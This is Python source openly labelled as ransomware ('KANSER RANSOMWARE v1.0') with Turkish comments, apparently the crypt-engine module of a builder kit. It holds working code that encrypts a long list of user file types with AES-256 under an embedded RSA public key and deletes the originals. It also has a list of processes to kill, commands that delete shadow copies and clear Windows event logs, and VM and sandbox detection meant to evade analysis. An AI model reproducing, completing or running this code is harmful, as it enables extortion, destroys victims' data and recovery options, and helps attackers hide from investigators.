#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER RANSOMWARE v1.0 — AES-256-CBC + RSA-2048 Encryption Engine
Multi-threaded, Anti-Forensic, Anti-Analysis
"""
import os, sys, json, base64, hashlib, threading, time, random, string
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes, padding as sym_padding
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("[!] Install: pip install cryptography")
    sys.exit(1)

# === CONFIG ===
CONFIG = {
    "extensions": [
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".csv",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai", ".svg",
        ".mp3", ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".m4a", ".wav",
        ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
        ".html", ".htm", ".php", ".js", ".css", ".py", ".java", ".cpp", ".c", ".h",
        ".sql", ".db", ".sqlite", ".mdb", ".accdb", ".dbf",
        ".pem", ".key", ".crt", ".cer", ".p12", ".pfx", ".ovpn",
        ".config", ".conf", ".ini", ".yml", ".yaml", ".json", ".xml"
    ],
    "exclude_dirs": ["Windows", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information", "Boot", "AppData\\Local\\Temp", "node_modules", ".git"],
    "exclude_files": ["desktop.ini", "thumbs.db", "NTUSER.DAT", "bootmgr", "BOOTNXT"],
    "max_file_size": 50 * 1024 * 1024,  # 50MB — buyuk dosyalari atla
    "min_file_size": 10,                 # 10 byte'dan kucukleri atla
    "encrypt_network": True,             # SMB/ag paylasimlari
    "encrypt_usb": True,                 # USB diskler
    "threads": 8,
    "extension": ".KRSN",
    "delete_shadows": True,
    "clear_logs": True,
    "kill_processes": ["sql", "outlook", "wordpad", "notepad", "onenote", "chrome", "firefox"],
    "ransom_note_name": "HOW_TO_DECRYPT.txt",
    "wallpaper_text": "DOSYALARIN SIFRELENDI! HOW_TO_DECRYPT.txt dosyasini oku.",
}

# === PUBLIC KEY (embedded — private key sadece sende) ===
RSA_PUBLIC_KEY_PEM = None  # Builder tarafindan doldurulur

def generate_keys():
    """RSA-2048 key pair olustur"""
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    public_key = private_key.public_key()
    return private_key, public_key

def encrypt_file(filepath, public_key, ext):
    """Tek dosyayi sifrele: AES-256-CBC + RSA key wrap"""
    try:
        size = os.path.getsize(filepath)
        if size < CONFIG["min_file_size"] or size > CONFIG["max_file_size"]: return False
        if os.path.basename(filepath).lower() in [f.lower() for f in CONFIG["exclude_files"]]: return False

        aes_key = os.urandom(32)   # AES-256
        iv = os.urandom(16)         # CBC IV

        with open(filepath, "rb") as f: plaintext = f.read()

        # AES-256-CBC Encrypt
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = sym_padding.PKCS7(128).padder()
        padded = padder.update(plaintext) + padder.finalize()
        ciphertext = encryptor.update(padded) + encryptor.finalize()

        # RSA-2048 Wrap AES Key
        encrypted_key = public_key.encrypt(aes_key, OAEP(mgf=MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))

        # Write: [encrypted_key (256B)] [iv (16B)] [ciphertext]
        newpath = filepath + ext
        with open(newpath, "wb") as f:
            f.write(encrypted_key)
            f.write(iv)
            f.write(ciphertext)

        os.remove(filepath)
        return True
    except: return False

def decrypt_file(filepath, private_key, ext):
    """Tek dosyayi coz"""
    try:
        if not filepath.endswith(ext): return False
        with open(filepath, "rb") as f:
            encrypted_key = f.read(256)
            iv = f.read(16)
            ciphertext = f.read()

        aes_key = private_key.decrypt(encrypted_key, OAEP(mgf=MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(padded) + unpadder.finalize()

        newpath = filepath[:-len(ext)]
        with open(newpath, "wb") as f: f.write(plaintext)
        os.remove(filepath)
        return True
    except: return False

def is_target_ext(filename):
    """Hedef uzantilardan biri mi?"""
    name = filename.lower()
    return any(name.endswith(e.lower()) for e in CONFIG["extensions"])

def is_excluded_dir(path):
    """Hedef disi klasor mu?"""
    path_lower = path.lower()
    return any(e.lower() in path_lower for e in CONFIG["exclude_dirs"])

def should_kill_process(name):
    """Process sonlandirilsin mi?"""
    return any(p.lower() in name.lower() for p in CONFIG["kill_processes"])

def anti_forensics():
    """Forensic onlemler"""
    results = []
    if CONFIG["delete_shadows"] and os.name == "nt":
        try:
            subprocess = __import__("subprocess")
            subprocess.run("vssadmin delete shadows /all /quiet", shell=True, capture_output=True)
            subprocess.run("wmic shadowcopy delete", shell=True, capture_output=True)
            results.append("Shadow copies deleted")
        except: pass
    if CONFIG["clear_logs"] and os.name == "nt":
        try:
            subprocess = __import__("subprocess")
            subprocess.run("wevtutil cl System", shell=True, capture_output=True)
            subprocess.run("wevtutil cl Security", shell=True, capture_output=True)
            subprocess.run("wevtutil cl Application", shell=True, capture_output=True)
            results.append("Event logs cleared")
        except: pass
    return results

def anti_analysis():
    """VM/Sandbox tespiti"""
    indicators = []
    vm_files = [
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
    ]
    for f in vm_files:
        if os.path.exists(f): indicators.append(f"VM File: {f}")

    vm_proc = ["vmtoolsd", "vmwaretray", "VBoxService", "vbox", "xenservice"]
    try:
        subprocess = __import__("subprocess")
        out = subprocess.check_output("tasklist", shell=True, timeout=5).decode(errors="ignore").lower()
        for p in vm_proc:
            if p.lower() in out: indicators.append(f"VM Process: {p}")
    except: pass

    sandbox_dirs = ["C:\\agent", "C:\\sandbox", "C:\\cuckoo"]
    for d in sandbox_dirs:
        if os.path.exists(d): indicators.append(f"Sandbox: {d}")

    if os.path.getsize("C:\\") < 30 * 1024 * 1024 * 1024:
        indicators.append("Small disk (<30GB)")

    ram = None
    try:
        import ctypes
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_uint32), ("dwMemoryLoad", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_uint64), ("ullAvailPhys", ctypes.c_uint64), ("ullTotalPageFile", ctypes.c_uint64), ("ullAvailPageFile", ctypes.c_uint64), ("ullTotalVirtual", ctypes.c_uint64), ("ullAvailVirtual", ctypes.c_uint64), ("ullAvailExtendedVirtual", ctypes.c_uint64)]
        m = MEMORYSTATUSEX(); m.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
        ram = m.ullTotalPhys / (1024**3)
    except: pass
    if ram and ram < 3.5: indicators.append(f"Low RAM ({ram:.1f}GB)")

    return indicators

if __name__ == "__main__":
    print("KANSER RANSOMWARE — Crypt Engine")
    print("Import this module from builder.py")
